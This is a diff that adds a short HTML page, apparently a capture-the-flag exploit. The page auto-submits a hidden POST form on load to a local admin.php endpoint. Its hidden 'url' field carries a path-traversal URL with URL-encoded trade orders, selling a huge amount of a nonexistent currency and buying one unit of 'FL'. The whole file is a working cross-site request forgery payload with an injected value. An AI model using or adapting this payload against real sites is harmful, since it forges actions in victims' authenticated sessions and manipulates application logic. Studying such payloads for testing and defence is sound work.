@@ -1,0 +1,8 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>auto-post</title>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="http://localhost:5000/admin.php" target="_self">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20NONEXISTENT%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY">
+  </form>
+</body>
